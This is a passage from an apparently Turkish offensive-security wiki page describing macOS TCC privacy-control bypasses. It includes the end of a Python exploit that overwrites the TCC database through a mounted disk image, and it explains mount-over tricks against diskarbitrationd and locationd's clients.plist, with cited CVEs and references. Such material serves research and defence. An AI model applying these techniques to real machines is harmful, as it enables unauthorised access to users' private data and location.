    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

[**Orijinal yazımdaki**](https://theevilbit.github.io/posts/cve-2021-30808/) **full exploit**'i inceleyin.<sup>[[21]](#references)</sup>

### CVE-2024-40855

[Orijinal yazıda](https://www.kandji.io/blog/macos-audit-story-part2) açıklandığı gibi, bu CVE `diskarbitrationd`'yi istismar ediyordu.<sup>[[16]](#references)</sup>

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` fonksiyonu güvenlik kontrollerini gerçekleştiriyordu. Ancak, `diskarbitrationd`'yi doğrudan çağırarak bu kontrolleri atlatmak ve böylece yolda `../` öğeleri ile symlink'ler kullanmak mümkündü.

Bu, `diskarbitrationd`'nin `com.apple.private.security.storage-exempt.heritable` entitlement'ı sayesinde bir saldırganın TCC veritabanının üzerine yazmak da dahil olmak üzere herhangi bir konuma mount işlemi yapmasına olanak tanıyordu.

### asr

**`/usr/sbin/asr`** aracı, tüm diski kopyalayıp TCC korumalarını atlayarak başka bir konuma mount etmeye olanak tanıyordu.

### CVE-2022-22655 - Konum Servisleri

Konum Servisleri, diğer servisler gibi bir TCC veritabanında **saklanmaz**. Bunları, kendi izin listesini **`/var/db/locationd/clients.plist`** dosyasında tutan `locationd` yönetir:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Her kayıt istemciye (bundle ID veya executable path) göre anahtarlanır ve `Authorized`, `BundleId`, `Executable` ve `Registered` gibi alanlar içerir.<sup>[[4]](#references)</sup>

`clients.plist` dosyasının kendisi Sandbox/TCC tarafından korunur ve root olarak bile düzenlenemez — ancak **`/var/db/locationd/` dizini mount işlemine karşı korunmuyordu**. Bu nedenle root olarak çalışan bir saldırgan, kendi `clients.plist` dosyasını (binary'si `Authorized` olarak işaretlenmiş şekilde) içeren bir disk image oluşturup bunu dizinin üzerine mount edebilir ve sahte izin listesinin devreye girmesi için `locationd`'yi yeniden başlatabilirdi.<sup>[[3]](#references)</sup>

> [!TIP]
> Bu, yukarıdaki `hdiutil`/`mount` TCC bypass'larıyla aynı yöntemdir: *dosya* korunur, içinde bulunduğu *dizin* korunmaz; bu yüzden dosyayı değil, dizinin tamamını değiştirirsiniz.

## Başlangıç uygulamalarıyla


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep ile

Bazı durumlarda dosyalar e-posta adresleri, telefon numaraları, mesajlar gibi hassas bilgileri korumasız konumlarda saklar (Apple'a göre bu bir güvenlik açığı sayılır).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanan başka bir yöntem:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework'ünü Bypass Etme](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [macOS TCC Kullanıcı Gizliliği Korumalarını Yanlışlıkla ve Tasarım Gereği Bypass Etme](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (orijinal rapor)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego Dünyanın Neresinde: macOS'ta Location Services'i Kötüye Kullanma](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass, iCloud'dan veri çalıyor](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG ortam değişkenleri)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - DYLD ortam değişkenlerine izin verme entitlement'ı](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malware'ında Zero-Day TCC bypass keşfedildi](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Mac'inizde Olan Mac'inizde Kalır, Apple'ın iCloud'unda mı?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Yeni macOS güvenlik açığı "powerdir", kullanıcı verilerine yetkisiz erişime yol açabilir](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Home directory'yi değiştirip TCC'yi bypass etme, diğer adıyla CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Müziği çalıp TCC'yi bypass etme, diğer adıyla CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Bir (Fire)fox nasıl soyulur](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOS'ta Telegram ile TCC'yi bypass etme](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Apple Güvenlik Açıklarını Ortaya Çıkarmak: diskarbitrationd ve storagekitd Denetimi, Bölüm 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks ve CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS X'te ortam değişkenlerini ayarlama](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass ve privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC veritabanının üzerine mount ederek TCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOS Gizlilik Mekanizmalarınızı Bypass Etmenin 20'den Fazla Yolu](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCC'ye Karşı Ezici Zafer - macOS Gizlilik Mekanizmalarınızı Bypass Etmenin 20'den Fazla YENİ Yolu](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Spotlight'tan Apple Intelligence'a — macOS AI'ı besleyen verileri çalmak için 0day'i kötüye kullanma](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
